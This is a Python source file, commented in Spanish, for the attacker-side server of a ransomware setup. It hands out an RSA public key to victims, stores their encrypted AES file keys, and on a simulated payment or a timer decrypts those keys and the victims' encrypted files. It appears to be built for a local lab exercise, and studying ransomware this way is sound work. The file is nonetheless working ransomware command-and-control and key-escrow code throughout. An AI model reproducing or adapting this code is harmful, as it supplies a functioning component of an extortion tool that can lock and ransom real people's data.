import socket, threading, json, base64, os
from cryptography.hazmat.backends import default_backend
from cryptography.hazmat.primitives import serialization, hashes
from cryptography.hazmat.primitives.ciphers import Cipher, algorithms, modes
from cryptography.hazmat.primitives.asymmetric import rsa, padding

class servidorAtacante:
    def __init__(self, host='localhost', port=9999, auto_release=True, release_delay=5):
        self.host = host
        self.port = port
        self.private_key = None
        self.public_key = None
        self.claves_guardadas = {}
        self.claves_disponibles = {}
        self.auto_release = auto_release
        self.release_delay = release_delay

    def generar_par_claves(self):
        print("Atacante: Generando par de claves RSA...")
        self.private_key = rsa.generate_private_key(
            public_exponent=65537,
            key_size=2048,
            backend=default_backend()
        )
        self.public_key = self.private_key.public_key()
        print("Par de claves RSA generado")

    def serializar_public_key(self):
        return self.public_key.public_bytes(
            encoding=serialization.Encoding.PEM,
            format=serialization.PublicFormat.SubjectPublicKeyInfo
        )

    def recibir_clave_cifrada(self, datos_victima):
        try:
            datos = json.loads(datos_victima)
            victim_id = datos['victim_id']
            clave_cifrada = base64.b64decode(datos['clave_cifrada'])
            self.claves_guardadas[victim_id] = clave_cifrada
            print(f"Atacante: Clave cifrada recibida y guardada para victima {victim_id}")

            
            if self.auto_release:
                try:
                    import threading
                    print(f"Atacante: Liberación automática activada, la clave se liberará en {self.release_delay}s para {victim_id}")
                    t = threading.Timer(self.release_delay, self.proceso_recuperacion, args=(victim_id,))
                    t.daemon = True
                    t.start()
                except Exception as e:
                    print(f"Atacante: Error al programar liberación automática: {e}")
            return True
        except Exception as e:
            print(f"Error recibiendo clave: {e}")
            return False

    def descifrar_clave_simetrica(self, clave_cifrada):
        try:
            clave_simetrica = self.private_key.decrypt(
                clave_cifrada,
                padding.OAEP(
                    mgf=padding.MGF1(algorithm=hashes.SHA256()),
                    algorithm=hashes.SHA256(),
                    label=None
                )
            )
            print("Atacante: Clave simetrica descifrada exitosamente")
            return clave_simetrica
        except Exception as e:
            print(f"Error descifrando clave: {e}")
            return None

    def manejar_victima(self, conn, addr):
        print(f"Atacante: Conexion establecida con {addr}")
        try:
            public_key_pem = self.serializar_public_key()
            conn.send(public_key_pem)
            print("Atacante: Clave publica enviada a la victima")

            datos_victima = conn.recv(4096).decode('utf-8')
            try:
                datos = json.loads(datos_victima)
            except Exception as e:
                print(f"Atacante: Error parseando JSON recibido: {e}")
                conn.send(b"ERROR: JSON invalido")
                return

            # Recuperacion (simulacion de pago)
            if datos.get('action') == 'recover' and 'victim_id' in datos:
                victim_id = datos['victim_id']
                resultado = self.proceso_recuperacion(victim_id)
                if resultado:
                    resp = json.dumps({'status': 'OK', 'clave_simetrica': resultado}).encode('utf-8')
                    conn.send(resp)
                    print(f"Atacante: Enviada clave simetrica (base64) para victima {victim_id}")
                else:
                    resp = json.dumps({'status': 'ERROR', 'message': 'Clave no encontrada o error'}).encode('utf-8')
                    conn.send(resp)

            elif 'victim_id' in datos and 'clave_cifrada' in datos:
                if self.recibir_clave_cifrada(json.dumps(datos)):
                    conn.send(b"OK: Clave recibida correctamente")
                else:
                    conn.send(b"ERROR: Problema con la clave")
            else:
                conn.send(b"ERROR: Mensaje no reconocido")

        except Exception as e:
            print(f"Error en comunicacion con victima: {e}")
        finally:
            conn.close()

    def iniciar_servidor(self):
        self.generar_par_claves()
        server_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        server_socket.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
        server_socket.bind((self.host, self.port))
        server_socket.listen(1)
        print(f"Servidor Atacante escuchando en {self.host}:{self.port}")
        print("Esperando conexiones de victimas...")

        try:
            while True:
                conn, addr = server_socket.accept()
                client_thread = threading.Thread(
                    target=self.manejar_victima,
                    args=(conn, addr)
                )
                client_thread.start()
        except KeyboardInterrupt:
            print("\nServidor detenido manualmente")
        finally:
            server_socket.close()

    def proceso_recuperacion(self, victim_id):
        """Descifra la clave simétrica y los archivos cifrados para victim_id.
        Escribe la clave en lab/sample_recovered/attacker_decrypted_keys.txt
        y los archivos descifrados en lab/sample_recovered/.
        Devuelve la clave simétrica (base64) si tiene éxito, o None si falla.
        """
        if victim_id in self.claves_disponibles:
            return self.claves_disponibles[victim_id]

        if victim_id not in self.claves_guardadas:
            return None

        print(f"Atacante: Simulando pago recibido para victima {victim_id}")
        clave_cifrada = self.claves_guardadas[victim_id]
        clave_simetrica = self.descifrar_clave_simetrica(clave_cifrada)
        if not clave_simetrica:
            return None

        clave_b64 = base64.b64encode(clave_simetrica).decode('utf-8')
        self.claves_disponibles[victim_id] = clave_b64

        try:
            os.makedirs('lab/sample_recovered', exist_ok=True)
            with open('lab/sample_recovered/attacker_decrypted_keys.txt', 'a', encoding='utf-8') as f:
                f.write(f"{victim_id}: {clave_b64}\n")
        except Exception as e:
            print(f"Atacante: Error persistiendo clave liberada: {e}")

        try:
            cipher_dir = os.path.join('lab', 'sample_cipher')
            recovered_dir = os.path.join('lab', 'sample_recovered')
            os.makedirs(recovered_dir, exist_ok=True)
            files_written = 0
            for fname in os.listdir(cipher_dir):
                if fname == 'ransom_note.txt':
                    continue
                fullpath = os.path.join(cipher_dir, fname)
                if not os.path.isfile(fullpath):
                    continue
                with open(fullpath, 'rb') as f:
                    data = f.read()
                if len(data) < 16:
                    print(f"Atacante: archivo cifrado demasiado corto: {fname}")
                    continue
                iv = data[:16]
                ciphertext = data[16:]
                cipher = Cipher(algorithms.AES(clave_simetrica), modes.CBC(iv))
                decryptor = cipher.decryptor()
                padded = decryptor.update(ciphertext) + decryptor.finalize()
                pad_len = padded[-1]
                if not (1 <= pad_len <= 16):
                    print(f"Atacante: padding inválido en {fname}")
                    continue
                plaintext = padded[:-pad_len]
                out_name = fname.replace('.enc', '')
                out_path = os.path.join(recovered_dir, out_name)
                with open(out_path, 'wb') as out_f:
                    out_f.write(plaintext)
                files_written += 1
            print(f"Atacante: {files_written} archivos descifrados escritos en {recovered_dir}")
        except Exception as e:
            print(f"Atacante: Error al descifrar archivos en proceso_recuperacion: {e}")

        print(f"Atacante: Clave simétrica (base64) para {victim_id}: {clave_b64}")
        return clave_b64

if __name__ == "__main__":
    servidor = servidorAtacante()
    servidor.iniciar_servidor()
